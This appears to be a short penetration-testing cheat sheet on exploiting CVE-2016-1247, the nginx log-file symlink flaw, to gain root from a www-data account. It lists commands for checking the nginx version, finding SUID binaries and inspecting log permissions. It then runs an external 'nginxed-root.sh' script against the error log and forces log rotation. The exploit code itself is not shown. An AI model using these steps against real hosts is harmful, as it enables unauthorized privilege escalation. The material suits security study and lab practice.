# Binary Symlinks

## EXAMPLE

# Author of the exploit: https://legalhackers.com/

# REQUIREMENTS

### Having the correct permissions of your user.

#### 1) As www-data or similar user, if you see that the machine is vulnerable to CVE-2016-1247 nginxed-root.sh, we do:

#### 2) 

    dpkg -l | grep nginx (Anyhing newer than 1.6.2 is patched)

#### 3) SUID bit on sudo required for the vulnerability to work

    find / -type f -perm -u=s -lsa 2>/dev/null 

#### 4) If your user has enough permissions on the folder, you can replace the log files with a malicious script via symlink

    ls -la /var/log/nginx 

#### 5) 

    ./nginxed-root.sh /var/log/nginx/error.log

#### 6) Create another SSH session (Unless there is a cronjob that restarts the nginx server)

#### 7) 

    invoke-rc.d nginx rotate >/dev/null 2>&1
